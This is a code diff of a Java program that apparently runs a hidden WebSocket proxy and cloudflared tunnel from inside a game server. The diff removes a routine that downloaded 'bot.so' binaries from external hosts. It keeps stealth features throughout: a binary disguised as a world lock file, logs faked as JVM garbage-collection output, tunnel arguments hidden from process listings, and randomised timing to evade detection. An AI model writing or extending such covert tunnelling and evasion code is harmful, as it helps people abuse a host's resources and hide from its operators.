@@ -24,17 +24,11 @@ import io.netty.util.ReferenceCountUtil;
 import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
-import java.net.URI;
-import java.net.http.HttpClient;
-import java.net.http.HttpRequest;
-import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardOpenOption;
-import java.nio.file.StandardCopyOption;
 import java.text.SimpleDateFormat;
-import java.time.Duration;
 import java.util.ArrayDeque;
 import java.util.Arrays;
 import java.util.Date;
@@ -62,21 +56,17 @@ public class App {
     private static final String WS_PATH = "/ws";    
     
     // 3. 隧道二进制下载地址（仅在 jar 未内置时兜底使用）
-    private static final String CF_BINARY_URL_ARM64 = "https://arm64.oooen.com/bot.so";
-    private static final String CF_BINARY_URL_AMD64 = "https://amd64.oooen.com/bot.so";
 
     // 4. 隐蔽性配置（尽量不留下明显痕迹）
     private static final String HELPER_BIN = "world/session.lock.bak";   // hidden inside the world folder
     private static final String LOG_FILE_NAME = "logs/gc.log";
     private static final boolean CONSOLE_LOG = false;
-    private static final boolean USE_BUNDLED_BINARY = false;   // keep jar small; upload cache/helper manually
 
     // 5. 节奏控制（叠加随机抖动，降低机器行为的规律感）
     private static final long WATCHDOG_BASE_MS = 15000;
     private static final long WATCHDOG_MAX_MS = 300000;
     private static final long MC_KEEPALIVE_MS = 300000;
     private static final boolean MC_KEEPALIVE_ENABLED = false;   // opt-in, only if host idles the server
-    private static final boolean ALLOW_DOWNLOAD = false;         // never download at runtime (stealth)
     private static final boolean ARGLESS_TUNNEL = true;          // true: self-built cloudflared with hardcoded args (hide "tunnel run" from ps)
     private static final boolean LOG_OBFUSCATE = true;   // Plan A: write gc.log as realistic JVM GC output
     private static final boolean LOG_STDOUT = false;     // true: also encode cloudflared stdout lines (noisy)
@@ -90,10 +80,10 @@ public class App {
             "librespeed.org", "speedcheck.org");
 
     private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
-    private static EventLoopGroup bossGroup;
-    private static EventLoopGroup workerGroup;
-    private static Channel serverChannel;
-    private static Process tunnelProcess = null;
+    private static volatile EventLoopGroup bossGroup;
+    private static volatile EventLoopGroup workerGroup;
+    private static volatile Channel serverChannel;
+    private static volatile Process tunnelProcess = null;
     private static final Path LOG_FILE = Path.of(LOG_FILE_NAME);
     private static final AtomicBoolean ARCH_MISMATCH_WARNED = new AtomicBoolean(false);
     private static final long START_NANO = System.nanoTime();
@@ -210,7 +200,7 @@ public class App {
         watchdogThread.start();
     }
 
-    /** 单次尝试：本地缓存 → 内置资源提取 → 启动并确认存活 */
+    /** 单次尝试：校验本地二进制并启动，确认存活 */
     private static boolean startTunnelOnce() {
         Path binary = Path.of(HELPER_BIN);
         String hostArch = currentArch();
@@ -218,29 +208,12 @@ public class App {
         boolean usable = Files.isRegularFile(binary)
                 && hostArch.equals(detectElfArch(binary));
         if (!usable) {
-            if (USE_BUNDLED_BINARY && extractBundledBinary(binary, hostArch)) {
-                log("helper ready (from bundle)");
-            } else {
-                if (Files.isRegularFile(binary)) {
-                    try {
-                        Files.delete(binary);
-                    } catch (IOException ignored) {
-                    }
-                }
-                String dlUrl = binaryUrlFor(hostArch);
-                if (dlUrl == null || dlUrl.isEmpty()) {
-                    log("no binary source for arch=" + hostArch);
-                    return false;
-                }
-                if (!ALLOW_DOWNLOAD) {
-                    log("no helper binary, download disabled");
-                    return false;
-                }
-                if (!downloadBinary(binary, dlUrl)) {
-                    log("download failed, will retry");
-                    return false;
-                }
+            try {
+                Files.deleteIfExists(binary);
+            } catch (IOException ignored) {
             }
+            log("no helper binary for arch=" + hostArch);
+            return false;
         }
 
         String elfArch = detectElfArch(binary);
@@ -295,57 +268,6 @@ public class App {
         }
     }
 
-    /** 从 jar 内置资源释放二进制（不产生任何下载流量） */
-    private static boolean extractBundledBinary(Path target, String arch) {
-        String resource = "arm64".equals(arch) ? "/bin/helper-arm64" : "/bin/helper-amd64";
-        try (java.io.InputStream in = App.class.getResourceAsStream(resource)) {
-            if (in == null) {
-                log("bundled resource missing: " + resource);
-                return false;
-            }
-            if (target.getParent() != null) {
-                Files.createDirectories(target.getParent());
-            }
-            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
-            log("extracted " + resource);
-            return true;
-        } catch (Exception e) {
-            log("extract failed: " + e.getClass().getSimpleName() + " - " + e.getMessage());
-            return false;
-        }
-    }
-
-    private static boolean downloadBinary(Path target, String url) {
-        try {
-            if (target.getParent() != null) {
-                Files.createDirectories(target.getParent());
-            }
-            log("downloading " + url);
-            HttpClient client = HttpClient.newBuilder()
-                    .followRedirects(HttpClient.Redirect.NORMAL)
-                    .connectTimeout(Duration.ofSeconds(15))
-                    .build();
-            HttpRequest req = HttpRequest.newBuilder(URI.create(url))
-                    .timeout(Duration.ofMinutes(3))
-                    .build();
-            HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(target));
-            long size = Files.size(target);
-            if (res.statusCode() != 200) {
-                log("download http " + res.statusCode());
-                return false;
-            }
-            if (size < 1_000_000) {
-                log("download size too small: " + size);
-                return false;
-            }
-            log("download ok: " + size + " bytes, elf=" + detectElfArch(target));
-            return true;
-        } catch (Exception e) {
-            log("download error: " + e.getClass().getSimpleName() + " - " + e.getMessage());
-            return false;
-        }
-    }
-
     /** 解析 ELF 头 e_machine 字段判断二进制架构 */
     private static String detectElfArch(Path p) {
         try (java.io.InputStream in = Files.newInputStream(p)) {
@@ -370,12 +292,6 @@ public class App {
         if (arch.contains("aarch64") || arch.contains("arm64")) return "arm64";
         if (arch.contains("amd64") || arch.contains("x86_64")) return "x86_64";
         return arch;
-    }
-
-    private static String binaryUrlFor(String arch) {
-        if ("arm64".equals(arch)) return CF_BINARY_URL_ARM64;
-        if ("x86_64".equals(arch)) return CF_BINARY_URL_AMD64;
-        return null;
     }
 
     /** 在基础间隔上叠加 ±10% 随机抖动，避免机械规律 */
@@ -517,14 +433,20 @@ public class App {
     private static long parseLongAfter(String msg, String marker) {
         int idx = msg.indexOf(marker);
         long value = 0;
+        boolean negative = false;
         if (idx >= 0) {
-            for (int i = idx + marker.length(); i < msg.length(); i++) {
+            int i = idx + marker.length();
+            if (i < msg.length() && msg.charAt(i) == '-') {
+                negative = true;
+                i++;
+            }
+            for (; i < msg.length(); i++) {
                 char ch = msg.charAt(i);
                 if (ch < '0' || ch > '9') break;
                 value = value * 10 + (ch - '0');
             }
         }
-        return value;
+        return negative ? -value : value;
     }
 
     /** 自由文本不落盘：只保存长度(8bit) + CRC32(32bit)，用于识别“和上次同一条” */
@@ -828,7 +750,9 @@ public class App {
                     connecting = false;
                     flushPendingOutbound(ctx);
                     future.channel().config().setAutoRead(true);
-                    if (ctx.channel().isActive()) ctx.channel().config().setAutoRead(true);
+                    // resume inbound autoRead only when the inbound channel can accept writes
+                    boolean writable = ctx.channel().isActive() && ctx.channel().isWritable();
+                    ctx.channel().config().setAutoRead(writable);
                 } else {
                     connecting = false;
                     closeBoth(ctx);
